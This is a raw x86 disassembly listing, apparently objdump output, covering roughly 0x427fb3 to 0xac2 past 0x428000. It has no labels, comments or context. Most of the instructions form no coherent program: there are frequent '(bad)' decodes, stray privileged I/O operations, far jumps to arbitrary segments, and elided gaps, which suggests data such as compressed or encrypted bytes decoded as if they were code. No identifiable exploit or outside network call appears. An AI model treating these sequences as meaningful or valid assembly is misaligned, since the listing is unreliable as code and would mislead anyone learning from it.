  427fb3:	jg     0x427fc7
  427fb5:	xor    ebp,DWORD PTR [ecx]
  427fb7:	pop    es
  427fb8:	sub    BYTE PTR [ebp-0x239cc9fb],al
  427fbe:	jns    0x427f8e
  427fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427fc1:	dec    ecx
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [ebx],esp
  428041:	mov    edi,0xa99424da
  428046:	add    DWORD PTR [eax],eax
  428048:	test   BYTE PTR [eax],0x0
  42804b:	add    BYTE PTR ds:0xa24dfef1,ah
  428051:	arpl   bx,dx
  428053:	jne    0x428012
  428055:	sahf   
  428056:	jo     0x4280c6
  428058:	es pop esp
  42805a:	out    dx,eax
  42805b:	jg     0x428078
  42805d:	push   cs
  42805e:	(bad)  
  428060:	jns    0x4280b5
  428062:	xchg   esi,eax
  428063:	pop    ds
  428064:	daa    
  428065:	imul   edx,ebp,0x6d
  428068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428069:	xlat   BYTE PTR ds:[ebx]
  42806a:	jbe    0x4280a5
  42806c:	loopne 0x4280c0
  42806e:	mov    dh,0xdd
  428070:	int3   
  428071:	xor    edi,DWORD PTR [eax]
  428073:	jle    0x42803a
  428075:	sbb    esp,0x6522fb2b
  42807b:	aam    0x47
  42807d:	push   0x17bd9e94
  428082:	mov    DWORD PTR ds:0xbf83081a,edi
  428088:	xchg   esp,eax
  428089:	cli    
  42808a:	pop    edi
  42808b:	cmp    ebp,ebx
  42808d:	inc    eax
  42808e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42808f:	mov    bh,0x1d
  428091:	fwait
  428092:	xchg   BYTE PTR [edx+0x5b],cl
  428095:	fs push esp
  428097:	dec    ebx
  428098:	lea    ebx,[edx+0x72]
  42809b:	fidivr WORD PTR [eax-0x4efe9b28]
  4280a1:	push   esi
  4280a2:	mov    dh,0xe
  4280a4:	not    ebp
  4280a6:	cmp    DWORD PTR [edx+eax*1],ebx
  4280a9:	lods   al,BYTE PTR ds:[esi]
  4280aa:	sub    eax,0x5bacfb8
  4280af:	add    ch,0x62
  4280b2:	mov    es,WORD PTR [edx]
  4280b4:	icebp  
  4280b5:	aaa    
  4280b6:	stc    
  4280b7:	scas   eax,DWORD PTR es:[edi]
  4280b8:	dec    eax
  4280b9:	(bad)  
  4280bb:	retf   0xfab8
  4280be:	jecxz  0x428057
  4280c0:	(bad)  
  4280c1:	push   ebp
  4280c2:	adc    ecx,0xaadeb231
  4280c8:	push   ebp
  4280c9:	imul   esi,DWORD PTR [ecx+0x2b54b3ea],0xffffffd0
  4280d0:	outs   dx,DWORD PTR ds:[esi]
  4280d1:	xchg   esp,eax
  4280d2:	icebp  
  4280d3:	data16 or dl,BYTE PTR [eax]
  4280d6:	jg     0x4280bd
  4280d8:	test   al,0x88
  4280da:	popa   
  4280db:	push   esi
  4280dc:	pop    ebp
  4280dd:	xchg   edx,eax
  4280de:	cmc    
  4280df:	popf   
  4280e0:	mov    al,ds:0xa8d544aa
  4280e5:	mov    esi,0x4995123c
  4280ea:	jmp    0x486f5258
  4280ef:	ret    0x2b7e
  4280f2:	sbb    dl,BYTE PTR [ebp+0x189ce603]
  4280f8:	mov    bl,bl
  4280fa:	pushw  ds
  4280fc:	cdq    
  4280fd:	pop    esp
  4280fe:	cdq    
  4280ff:	dec    esi
  428100:	push   edx
  428101:	aad    0x5
  428103:	gs and al,0xd2
  428106:	mov    ebp,0xb951be8f
  42810b:	rcr    BYTE PTR [ebp+0x23],cl
  42810e:	rcr    ebp,0xb6
  428111:	out    0x93,al
  428113:	ins    DWORD PTR es:[edi],dx
  428114:	mov    BYTE PTR [eax+eiz*2],ah
  428117:	mov    BYTE PTR [edx],ch
  428119:	and    ah,dl
  42811b:	sub    ecx,DWORD PTR [ebx-0x126b319b]
  428121:	out    dx,al
  428122:	inc    esp
  428123:	mov    al,ds:0xc31ec883
  428128:	mov    al,ds:0x8d116d20
  42812d:	jecxz  0x42815a
  42812f:	jle    0x4280e4
  428131:	nop
  428132:	adc    ecx,0xffffffa5
  428135:	lods   al,BYTE PTR cs:[esi]
  428137:	sbb    ebx,DWORD PTR [ecx-0x60]
  42813a:	mov    ecx,0xc401585e
  42813f:	xchg   ebx,eax
  428140:	xchg   ebp,eax
  428141:	rol    DWORD PTR [eax],cl
	...
  4281b3:	add    BYTE PTR [esi],bl
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0x1659944f
  4281c3:	cmp    DWORD PTR [edx-0x9fffe56],ecx
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    BYTE PTR [eax],cl
  4281cd:	test   BYTE PTR [edx-0x6ea5c4f8],ch
  4281d3:	pop    ebx
  4281d4:	sub    DWORD PTR [edi+0x6],esp
  4281d7:	fmul   QWORD PTR [edi]
  4281d9:	loop   0x428189
  4281db:	push   0xffffffc8
  4281dd:	into   
  4281de:	leave  
  4281df:	sbb    bh,ah
  4281e1:	cmp    ebx,DWORD PTR [ebp+0x1d]
  4281e4:	es dec ebx
  4281e6:	fimul  WORD PTR [eax+0x5ca10af8]
  4281ec:	pop    esi
  4281ed:	lods   al,BYTE PTR ds:[esi]
  4281ee:	cli    
  4281ef:	inc    ecx
  4281f0:	jp     0x428184
  4281f2:	xor    bh,0xb0
  4281f5:	add    al,0x7
  4281f7:	xchg   edi,eax
  4281f8:	test   al,0xba
  4281fa:	fstp   QWORD PTR [edi+edi*1-0x209b4f3c]
  428201:	ja     0x42826f
  428203:	mov    ds:0x7fb64a72,al
  428208:	inc    ebx
  428209:	mov    edi,DWORD PTR [ebx+0x561570b6]
  42820f:	pop    ebp
  428210:	pop    DWORD PTR [edx]
  428212:	sub    DWORD PTR [ebp+ebx*1+0x25],ebx
  428216:	adc    ebx,edi
  428218:	mov    ch,0x67
  42821a:	fsub   DWORD PTR [edx-0x49]
  42821d:	cmc    
  42821e:	push   0xffffffc9
  428220:	xchg   ecx,eax
  428221:	mov    dl,0x6c
  428223:	sbb    ecx,DWORD PTR [edx-0x5a]
  428226:	mov    WORD PTR ds:0x93451b09,es
  42822c:	push   esi
  42822d:	fisub  DWORD PTR [ebx]
  42822f:	sub    al,0xb7
  428231:	xlat   BYTE PTR ds:[ebx]
  428232:	mov    dh,0x30
  428234:	or     ecx,edi
  428236:	and    eax,0xd453ed43
  42823b:	fisttp QWORD PTR [esi+esi*8-0x7e]
  42823f:	and    al,0x30
  428241:	xchg   ecx,eax
  428242:	imul   ebp,DWORD PTR [eax-0x4c4f88d],0xffffffad
  428249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42824a:	retf   0x2e48
  42824d:	xor    al,0x90
  42824f:	fdiv   DWORD PTR [edi]
  428251:	fistp  DWORD PTR [ecx]
  428253:	int    0x4a
  428255:	pop    ebx
  428256:	adc    BYTE PTR [ebx],ch
  428258:	scas   al,BYTE PTR es:[edi]
  428259:	adc    BYTE PTR [esi],bl
  42825b:	and    al,BYTE PTR [ebx-0x6628794b]
  428261:	pop    ebx
  428262:	arpl   WORD PTR [eax+0x62a44bb3],di
  428268:	out    dx,al
  428269:	add    BYTE PTR [edx+0x6bfee620],0x52
  428270:	jae    0x428242
  428272:	and    DWORD PTR [esp+esi*2-0x4ecb8466],esi
  428279:	mov    esi,0x8672b6f9
  42827e:	mov    al,0xaf
  428280:	ret    0xfaa4
  428283:	and    ebp,DWORD PTR [edi-0x13]
  428286:	daa    
  428287:	mov    ds:0x25b47097,eax
  42828c:	lea    esi,[esi-0x28]
  42828f:	mov    ah,0x52
  428291:	and    al,0x97
  428293:	push   edi
  428294:	dec    esi
  428295:	retf   0x724
  428298:	add    al,0x1d
  42829a:	jmp    0xb85:0x43e87de7
  4282a1:	ds sub eax,0xaaa40ad3
  4282a7:	push   ds
  4282a8:	outs   dx,DWORD PTR ds:[esi]
  4282a9:	sbb    BYTE PTR [ebx],0x1a
  4282ac:	mov    ch,BYTE PTR [ebp+esi*2+0x73]
  4282b0:	rol    ah,0x3e
  4282b3:	test   al,0x25
  4282b5:	pop    esp
  4282b6:	inc    edx
  4282b7:	cmp    dl,bh
  4282b9:	sar    DWORD PTR ds:0x493b0e56,0x51
  4282c0:	mov    al,ds:0x54
	...
  428331:	add    BYTE PTR [eax],al
  428333:	add    BYTE PTR [edx],dl
  428335:	sbb    eax,0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428341:	sbb    eax,0xab80a119
  428346:	add    DWORD PTR [eax],eax
  428348:	test   BYTE PTR [eax],0x0
  42834b:	add    al,bl
  42834d:	inc    ecx
  42834e:	jecxz  0x42839a
  428350:	mov    ah,0x95
  428352:	fs dec eax
  428354:	fcomp  DWORD PTR [edi-0x6cf30cab]
  42835a:	rcr    BYTE PTR [esi],1
  42835c:	or     eax,0x599462b1
  428361:	or     eax,0xc0b3a7a5
  428366:	je     0x42834d
  428368:	and    BYTE PTR [ebp-0x4d],0x50
  42836c:	sub    edi,DWORD PTR [ecx]
  42836e:	(bad)  
  42836f:	dec    edi
  428370:	outs   dx,DWORD PTR ds:[esi]
  428371:	les    eax,FWORD PTR [esi+0x1308795]
  428377:	sti    
  428378:	js     0x4283f4
  42837a:	mov    ebp,0xf175607c
  42837f:	and    ebp,DWORD PTR [ebp+eiz*8-0xf]
  428383:	repz jmp 0x7ecad9e1
  428389:	push   edx
  42838a:	cmp    DWORD PTR [esi+0x3901b4d],0x914e78de
  428394:	(bad)  
  428395:	inc    edi
  428396:	jmp    0x428375
  428398:	mov    BYTE PTR [eax],cl
  42839a:	jmp    0x78e99f87
  42839f:	push   ebp
  4283a0:	in     al,dx
  4283a1:	xchg   edi,eax
  4283a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283a3:	or     DWORD PTR [edx+0x32],edx
  4283a6:	pop    es
  4283a7:	in     al,dx
  4283a8:	repz adc esp,DWORD PTR [ebx+0x23]
  4283ac:	stc    
  4283ad:	mov    bh,0x63
  4283af:	sub    BYTE PTR [edx],bl
  4283b1:	aad    0x76
  4283b3:	loopne 0x428376
  4283b5:	and    DWORD PTR [ebx-0x26],edx
  4283b8:	sar    BYTE PTR [ebp+0x5b],0x7a
  4283bc:	daa    
  4283bd:	sbb    eax,0x946db919
  4283c2:	mov    cl,0x7f
  4283c4:	repz iret 
  4283c6:	test   BYTE PTR cs:[edi-0x16],al
  4283ca:	fwait
  4283cb:	outs   dx,DWORD PTR ds:[esi]
  4283cc:	adc    esi,ebx
  4283ce:	jmp    0xced2edc2
  4283d3:	pop    ebp
  4283d4:	add    ch,BYTE PTR [edx+0x3f]
  4283d7:	push   esi
  4283d8:	inc    eax
  4283d9:	or     DWORD PTR [esi-0x76],ebx
  4283dc:	cwde   
  4283dd:	shr    edi,1
  4283df:	cmp    BYTE PTR [ecx+ebp*2-0x9],bl
  4283e3:	out    dx,eax
  4283e4:	mov    cl,0x75
  4283e6:	push   cs
  4283e7:	jne    0x42837b
  4283e9:	xchg   esp,eax
  4283ea:	cld    
  4283eb:	adc    al,BYTE PTR [esp+ebp*1]
  4283ee:	out    0x34,al
  4283f0:	dec    ebp
  4283f1:	mov    esi,0xd608b83
  4283f6:	mov    ecx,0x4bbf2c65
  4283fb:	pop    ds
  4283fc:	mov    BYTE PTR [ebx+0x7c],ah
  4283ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428400:	xchg   edi,eax
  428401:	pushf  
  428402:	test   eax,0x20b5909d
  428407:	(bad)  
  428408:	cmp    BYTE PTR [edx],ch
  42840a:	cmp    eax,DWORD PTR [ecx-0x5f628880]
  428410:	inc    eax
  428411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428412:	sti    
  428413:	cmp    DWORD PTR [eax],esp
  428415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428416:	xor    BYTE PTR [eax-0x1c],cl
  428419:	mov    al,0x28
  42841b:	inc    edx
  42841c:	daa    
  42841d:	mov    ebx,0xfa6f99b7
  428422:	cmp    eax,0x718997db
  428427:	inc    ebx
  428428:	xchg   ecx,eax
  428429:	push   esp
  42842a:	xchg   BYTE PTR [ecx-0x5e1c555e],bl
  428430:	xor    DWORD PTR [ebp+0x7c],ecx
  428433:	imul   esp,DWORD PTR [ebx-0x2c568906],0x6991dc27
  42843d:	jno    0x4283d1
  42843f:	arpl   WORD PTR [ebx],cx
  428441:	add    DWORD PTR [eax],0x0
	...
  4284b3:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx+0x46b3407]
  4284c1:	out    0xc,eax
  4284c3:	xor    dh,BYTE PTR [esi-0x54]
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	test   BYTE PTR [eax],0x0
  4284cb:	add    dl,ah
  4284cd:	adc    BYTE PTR ds:0xeb69a18e,0xd0
  4284d4:	ret    
  4284d5:	aad    0x96
  4284d7:	inc    ebp
  4284d8:	pop    ecx
  4284d9:	arpl   bp,di
  4284db:	add    DWORD PTR [ebx+eax*8],ebp
  4284de:	loop   0x428513
  4284e0:	adc    BYTE PTR [ebp+0x0],0xe8
  4284e4:	cmp    eax,0xe80a14fc
  4284e9:	jg     0x4284da
  4284eb:	jnp    0x428549
  4284ed:	inc    ecx
  4284ee:	cli    
  4284ef:	xchg   edx,eax
  4284f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f1:	and    eax,0x6658f16a
  4284f6:	sahf   
  4284f7:	push   esp
  4284f8:	push   ss
  4284f9:	mov    WORD PTR [esi],cs
  4284fb:	(bad)
  4284fe:	(bad)  [ecx]
  428500:	jns    0x4284ad
  428502:	popa   
  428503:	sub    eax,0xd9f3e5a0
  428508:	push   ebx
  428509:	scas   al,BYTE PTR es:[edi]
  42850a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42850b:	mov    ?,WORD PTR [edx-0x744115e2]
  428511:	inc    esi
  428512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428513:	or     eax,0x830d4b5d
  428518:	mov    al,BYTE PTR fs:[eax+edi*8+0x57]
  42851d:	jg     0x4284c2
  42851f:	inc    edx
  428520:	and    BYTE PTR [edi+eax*4-0x1771b8d7],dh
  428527:	cmp    DWORD PTR [esi-0x3b8fb316],edx
  42852d:	popf   
  42852e:	int3   
  42852f:	pushf  
  428530:	inc    edx
  428531:	xchg   BYTE PTR [ecx],bh
  428533:	jl     0x4284e7
  428535:	dec    edi
  428536:	xor    ah,BYTE PTR [eax+ecx*1+0x7]
  42853a:	(bad)  
  42853b:	sub    ebx,eax
  42853d:	ds (bad) 
  42853f:	sbb    al,BYTE PTR [ebp-0x2efdc74a]
  428545:	out    dx,al
  428546:	test   al,0x55
  428548:	push   ecx
  428549:	fldl2e 
  42854b:	aaa    
  42854c:	pop    esi
  42854d:	mov    esp,0x5876702d
  428552:	fsub   QWORD PTR [ecx-0x868e04d]
  428558:	mov    bl,0x7c
  42855a:	adc    al,0x44
  42855c:	fcomp  QWORD PTR [esi+0x32724277]
  428562:	xlat   BYTE PTR ds:[ebx]
  428563:	mov    ds:0x64309939,al
  428568:	sbb    al,0x87
  42856a:	xor    DWORD PTR [edi-0x1c],ebx
  42856d:	fimul  WORD PTR [ecx-0x19]
  428570:	mov    eax,ds:0xe3ce2268
  428575:	sub    esi,DWORD PTR [esp+edx*2+0x5d]
  428579:	nop
  42857a:	push   es
  42857b:	addr16 in al,0x7e
  42857e:	mov    al,0xca
  428580:	gs in  eax,dx
  428582:	adc    al,0xc7
  428584:	mov    ch,0x45
  428586:	ja     0x42853e
  428588:	pop    ecx
  428589:	pop    es
  42858a:	pop    edx
  42858b:	add    BYTE PTR [ecx-0x241a70],ch
  428591:	lahf   
  428592:	adc    esi,eax
  428594:	push   ebp
  428595:	sbb    al,0x96
  428597:	add    cl,BYTE PTR [ebx]
  428599:	frstpm(287 only) 
  42859b:	es fyl2xp1 
  42859e:	pop    esi
  42859f:	jmp    0x4285b1
  4285a1:	(bad)  
  4285a2:	mov    al,ds:0x1e9979db
  4285a7:	ss ret 
  4285a9:	pop    ebx
  4285aa:	pop    ecx
  4285ab:	xchg   ebx,eax
  4285ac:	mov    ds:0xe029d740,al
  4285b1:	(bad)  
  4285b2:	mov    dl,0x80
  4285b4:	gs iret 
  4285b6:	mov    ds:0xc50585cd,eax
  4285bb:	xlat   BYTE PTR ds:[ebx]
  4285bc:	mov    al,ds:0x55747343
  4285c1:	call   0x0:0x0
	...
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	daa    
  428641:	sbb    BYTE PTR [edi+ecx*2],al
  428644:	ins    BYTE PTR es:[edi],dx
  428645:	lods   eax,DWORD PTR ds:[esi]
  428646:	add    DWORD PTR [eax],eax
  428648:	test   BYTE PTR [eax],0x0
  42864b:	add    cl,cl
  42864d:	dec    ebp
  42864e:	dec    ebx
  42864f:	or     ebx,ebp
  428651:	out    0xa5,al
  428653:	js     0x428661
  428655:	adc    edi,DWORD PTR [edx-0x73]
  428658:	add    BYTE PTR [ebp-0x50bf1c79],ah
  42865e:	xchg   edx,eax
  42865f:	loop   0x42865a
  428661:	dec    edi
  428662:	cs jl  0x428617
  428665:	out    0x8,eax
  428667:	adc    ah,al
  428669:	jns    0x4286b8
  42866b:	xchg   ebx,eax
  42866c:	aad    0x20
  42866e:	mov    ebx,edi
  428670:	jmp    0xa3a3:0xbd1e128d
  428677:	test   al,0xa8
  428679:	adc    eax,0xa09381b
  42867e:	xlat   BYTE PTR ds:[ebx]
  42867f:	mov    bh,0x43
  428681:	out    0xbf,eax
  428683:	outs   dx,BYTE PTR ds:[esi]
  428684:	dec    esp
  428685:	jge    0x4286d4
  428687:	adc    esi,ecx
  428689:	jno    0x4286d0
  42868b:	ss ins DWORD PTR es:[edi],dx
  42868d:	inc    esp
  42868e:	ds clc 
  428690:	mov    edi,0x52ba38cb
  428696:	scas   eax,DWORD PTR es:[edi]
  428697:	sbb    cl,BYTE PTR [ecx+0xc2f3333]
  42869d:	or     ebp,DWORD PTR [ecx]
  42869f:	and    DWORD PTR [esi+ecx*2-0x718d0632],esp
  4286a6:	shl    BYTE PTR [eax-0x25],cl
  4286a9:	retf   0x2133
  4286ac:	test   DWORD PTR [ebx-0x6dbd7651],eax
  4286b2:	nop
  4286b3:	aas    
  4286b4:	leave  
  4286b5:	lahf   
  4286b6:	pop    esp
  4286b7:	sahf   
  4286b8:	mov    ds:0x6986f726,al
  4286be:	(bad)  
  4286c0:	cmc    
  4286c1:	fwait
  4286c2:	push   esi
  4286c3:	xchg   bh,ah
  4286c5:	dec    ebx
  4286c6:	adc    DWORD PTR [edx+edx*2+0x7e],edi
  4286ca:	xchg   ecx,eax
  4286cb:	xor    ebx,DWORD PTR [ecx-0x9]
  4286ce:	and    edi,DWORD PTR [ecx+0x2defb262]
  4286d4:	mov    bh,0xd0
  4286d6:	xchg   BYTE PTR [ecx+edi*4],bl
  4286d9:	std    
  4286da:	ins    BYTE PTR es:[edi],dx
  4286db:	or     bl,BYTE PTR [ebp-0x6d]
  4286de:	retf   
  4286df:	push   eax
  4286e0:	addr16 mov ds:0x460,eax
  4286e4:	hlt    
  4286e5:	sbb    ah,BYTE PTR [edi-0x7d5a3d9b]
  4286eb:	mov    cl,0x2d
  4286ed:	sub    BYTE PTR [ecx+edx*4+0x5d],ah
  4286f1:	inc    esp
  4286f2:	or     al,0x8e
  4286f4:	lods   al,BYTE PTR ds:[esi]
  4286f5:	and    al,0x5c
  4286f7:	sub    DWORD PTR [eax],esp
  4286f9:	fadd   QWORD PTR [ecx-0x17]
  4286fc:	daa    
  4286fd:	into   
  4286fe:	ret    0xd0a3
  428701:	dec    edx
  428702:	dec    edx
  428703:	mov    WORD PTR [ebp-0x76],?
  428706:	dec    eax
  428707:	mov    DWORD PTR [edx],ebx
  428709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42870a:	fld    st(2)
  42870c:	mov    BYTE PTR [esp+ecx*2+0x4d],al
  428710:	sub    eax,0x26fb8366
  428715:	mov    al,ds:0xa703aebf
  42871a:	cmp    cl,al
  42871c:	ins    DWORD PTR es:[edi],dx
  42871d:	jmp    DWORD PTR [ebx+ebp*8]
  428720:	sub    bl,BYTE PTR [edx]
  428722:	adc    al,0x0
  428724:	add    eax,esi
  428726:	ret    0x77b3
  428729:	mov    edi,0x5c22437a
  42872e:	inc    edx
  42872f:	add    ecx,edx
  428731:	mov    ebp,0xf269619b
  428736:	stos   DWORD PTR es:[edi],eax
  428737:	(bad)  [ebx+0x3a]
  42873a:	xor    edi,edi
  42873c:	mov    BYTE PTR [edi-0x3],al
  42873f:	(bad)  
  428740:	jae    0x4287b1
	...
  4287b2:	add    BYTE PTR [eax],al
  4287b4:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4287ba:	pop    esi
  4287bb:	fbstp  TBYTE PTR [ebx]
  4287bd:	mov    edx,0x3787299e
  4287c2:	arpl   WORD PTR [edx+eiz*2],si
  4287c5:	scas   al,BYTE PTR es:[edi]
  4287c6:	add    DWORD PTR [eax],eax
  4287c8:	test   BYTE PTR [eax],0x0
  4287cb:	add    BYTE PTR [edx],dl
  4287cd:	xor    bh,dl
  4287cf:	cmp    BYTE PTR [ebx+0x5be4fca6],cl
  4287d5:	sbb    eax,0x1e86520c
  4287da:	and    eax,0x7fc96df3
  4287df:	jmp    0xfe1:0xcaae419d
  4287e6:	adc    BYTE PTR [edi+ecx*4-0x1c],ch
  4287ea:	pop    edx
  4287eb:	mov    ah,0x8d
  4287ed:	stos   DWORD PTR es:[edi],eax
  4287ee:	dec    edx
  4287ef:	xchg   esi,eax
  4287f0:	mov    ch,0xf8
  4287f2:	or     al,0x4f
  4287f4:	xchg   esp,eax
  4287f5:	mov    cs,WORD PTR [ecx+eiz*2+0x4951beaa]
  4287fc:	cwde   
  4287fd:	add    al,0xa7
  4287ff:	dec    ecx
  428800:	int3   
  428801:	in     eax,dx
  428802:	dec    ebp
  428803:	(bad)  
  428804:	fldenv [edi-0x28]
  428807:	shl    dh,cl
  428809:	add    eax,0x2681ed52
  42880e:	in     eax,dx
  42880f:	mov    eax,0xbb5455e2
  428814:	ficomp WORD PTR [ebp-0x11b7a8bf]
  42881a:	sbb    dh,dh
  42881c:	cmp    eax,0xddad1c7f
  428821:	arpl   WORD PTR [edi],si
  428823:	enter  0xa9d5,0x41
  428827:	out    dx,al
  428828:	aam    0xc6
  42882a:	call   0x48700b76
  42882f:	mov    WORD PTR [esi+0x285cde21],gs
  428835:	sbb    eax,0x18943c44
  42883a:	outs   dx,BYTE PTR ds:[esi]
  42883b:	test   eax,0xb5579915
  428840:	ficom  WORD PTR [ebx+0x5522d06c]
  428846:	cmp    al,0x45
  428848:	gs repz and esp,edi
  42884c:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42884e:	hlt    
  42884f:	outs   dx,DWORD PTR ds:[esi]
  428850:	cwde   
  428851:	test   eax,0x99c1face
  428856:	dec    esp
  428857:	or     BYTE PTR [edi],dh
  428859:	out    dx,al
  42885a:	fs xchg esi,eax
  42885c:	test   esp,ebp
  42885e:	imul   edx,DWORD PTR [edi],0x91fcfc28
  428864:	jns    0x4288ba
  428866:	or     al,0x1
  428868:	xor    BYTE PTR [ebx],ch
  42886a:	sbb    ecx,ecx
  42886c:	push   ds
  42886d:	mov    edx,esi
  42886f:	das    
  428870:	std    
  428871:	arpl   WORD PTR [ecx],si
  428873:	rol    esi,cl
  428875:	mov    ecx,DWORD PTR [edi]
  428877:	bound  edi,QWORD PTR [ebx+ecx*4]
  42887a:	jo     0x4288a3
  42887c:	stos   BYTE PTR es:[edi],al
  42887d:	sub    ecx,DWORD PTR [esi-0x5a]
  428880:	mov    cl,BYTE PTR [eax]
  428882:	rcr    DWORD PTR [eax-0x6],0x20
  428886:	bound  ebx,QWORD PTR ds:0xa676b64
  42888c:	outs   dx,BYTE PTR ds:[esi]
  42888d:	ret    0xa404
  428890:	lds    ecx,FWORD PTR [edx+ebx*1+0x1a]
  428894:	sub    DWORD PTR [esi-0x5a],edi
  428897:	daa    
  428898:	push   cs
  428899:	jge    0x428905
  42889b:	jnp    0x428897
  42889d:	popf   
  42889e:	test   ecx,ecx
  4288a0:	gs daa 
  4288a2:	or     al,0xa8
  4288a4:	and    DWORD PTR [eax+ebp*8-0x8],edi
  4288a8:	es dec eax
  4288aa:	pop    ecx
  4288ab:	nop
  4288ac:	rcr    BYTE PTR [ebp+0x105df742],0xb3
  4288b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288b4:	jmp    0xb38b:0xaf4291e2
  4288bb:	pop    esp
  4288bc:	sub    eax,0xf6f6fe92
  4288c1:	mov    al,ds:0x0
	...
  428932:	add    BYTE PTR [eax],al
  428934:	call   0xdea3:0xffa3ffdd
  42893b:	std    
  42893c:	clc    
  42893d:	jns    0x4289b6
  42893f:	jmp    0xaf58:0xdde82a69
  428946:	add    DWORD PTR [eax],eax
  428948:	test   BYTE PTR [eax],0x0
  42894b:	add    al,dl
  42894d:	rcr    bh,1
  42894f:	cmp    ecx,DWORD PTR [ecx+0x72536676]
  428955:	xor    BYTE PTR [esi-0x7e6b658e],dl
  42895b:	jbe    0x4289d4
  42895d:	int    0xdc
  42895f:	(bad)  
  428960:	outs   dx,BYTE PTR ds:[esi]
  428961:	dec    BYTE PTR [edx+0x3977df5c]
  428967:	rcr    BYTE PTR [ebx+0x712a401d],cl
  42896d:	jno    0x4288fd
  42896f:	pop    eax
  428970:	jno    0x42895e
  428972:	fist   DWORD PTR [eax-0x4]
  428975:	int3   
  428976:	add    DWORD PTR [eax],esi
  428978:	pop    ebx
  428979:	cs mov cl,0xf5
  42897c:	push   ebx
  42897d:	xor    ecx,DWORD PTR [edi]
  42897f:	loop   0x428945
  428981:	push   ds
  428982:	cli    
  428983:	dec    ebx
  428984:	push   ecx
  428985:	xor    DWORD PTR [ebx-0x30],esi
  428988:	or     eax,0x6363dbb8
  42898d:	pop    esp
  42898e:	fldcw  WORD PTR [ecx+ebx*2]
  428991:	mov    ah,0x86
  428993:	sub    eax,ecx
  428995:	xchg   edi,eax
  428996:	out    dx,eax
  428997:	test   BYTE PTR [ebx-0x60],bl
  42899a:	jnp    0x42892c
  42899c:	ins    DWORD PTR es:[edi],dx
  42899d:	adc    BYTE PTR [ebx+0x2e],0xd5
  4289a1:	push   ebp
  4289a2:	jle    0x42899f
  4289a4:	mov    ah,0xb1
  4289a6:	cmp    BYTE PTR [ecx],dh
  4289a8:	rol    DWORD PTR [esi-0x4a],0xee
  4289ac:	loope  0x428946
  4289ae:	push   0xd3285f01
  4289b3:	jae    0x428a20
  4289b5:	adc    edi,DWORD PTR [edi-0x50746c97]
  4289bb:	jmp    0x50f6efe2
  4289c0:	(bad)  ds:0xfc6679fd
  4289c6:	ret    0xaf90
  4289c9:	into   
  4289ca:	retf   0x436d
  4289cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289ce:	add    al,0xfd
  4289d0:	pop    edx
  4289d1:	iret   
  4289d2:	imul   eax,DWORD PTR [ecx+0x73ff227c],0x4a087cdb
  4289dc:	sub    edx,DWORD PTR [edi+0x44f9b823]
  4289e2:	jge    0x42898e
  4289e4:	(bad)  
  4289e6:	cmp    esp,DWORD PTR [edx]
  4289e8:	fdiv   DWORD PTR [ecx-0x2f]
  4289eb:	(bad)  
  4289ec:	xchg   esp,eax
  4289ed:	(bad)  
  4289ee:	pop    ecx
  4289ef:	pop    ecx
  4289f0:	cmp    dh,BYTE PTR [ebx+esi*4-0x5b]
  4289f4:	(bad)  
  4289f5:	mov    ebp,DWORD PTR [ebx+0x3eeee026]
  4289fb:	(bad)  
  4289fc:	jmp    0x428a60
  4289fe:	mov    BYTE PTR [ecx],bl
  428a00:	sbb    al,0x7c
  428a02:	imul   ebp,eax,0xc4b769ff
  428a08:	mov    al,0x0
  428a0a:	es xchg edx,eax
  428a0c:	or     ecx,edi
  428a0e:	jmp    0x86b49329
  428a13:	mov    esp,0x795c736b
  428a18:	out    dx,eax
  428a19:	ret    0x75f6
  428a1c:	and    ebp,edi
  428a1e:	jo     0x4289f6
  428a20:	out    dx,eax
  428a21:	push   edi
  428a22:	pop    ss
  428a23:	leave  
  428a24:	add    al,0x27
  428a26:	sbb    cl,BYTE PTR [ecx]
  428a28:	cmp    bl,BYTE PTR [edi+edx*1+0x68]
  428a2c:	push   0xffffffa8
  428a2e:	ds loop 0x428a87
  428a31:	pushf  
  428a32:	test   BYTE PTR [edi+0x509bfa68],bl
  428a38:	or     al,0xe7
  428a3a:	or     al,0xad
  428a3c:	mov    cl,0xd3
  428a3e:	das    
  428a3f:	into   
  428a40:	pop    ds
  428a41:	push   edx
	...
  428ab2:	add    BYTE PTR [eax],al
  428ab4:	retf   0x528b
  428ab7:	jnp    0x428b0c
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0xfd9ef691
  428ac2:	sar    BYTE PTR [ebx+0x4e],1
